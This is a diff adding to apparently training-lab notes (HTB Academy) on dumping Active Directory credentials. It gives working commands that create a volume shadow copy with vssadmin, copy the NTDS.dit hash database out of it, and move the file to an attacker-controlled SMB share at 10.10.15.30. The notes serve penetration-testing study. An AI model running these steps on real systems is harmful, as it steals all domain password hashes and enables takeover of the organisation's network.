@@ -18,3 +18,20 @@ Checking User Account Privileges including Domain
 ```bash
 net user username
 ```
+This account has both Administrators and Domain Administrator rights which means we can do just about anything we want, including making a copy of the NTDS.dit file.
+
+# Creating Shadow Copy of C:
+From powershell:
+```bash
+vssadmin CREATE SHADOW /For=C:
+```
+![image](https://github.com/offensivecyber03/htbacademy/assets/71892943/675095d8-1f51-41d8-bb56-4baa179f2d3e)
+
+## Copying NTDS.dit from the VSS
+```bash
+cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
+```
+To transfer file into linux smb server:
+```bash
+PS C:\NTDS> cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData
+```
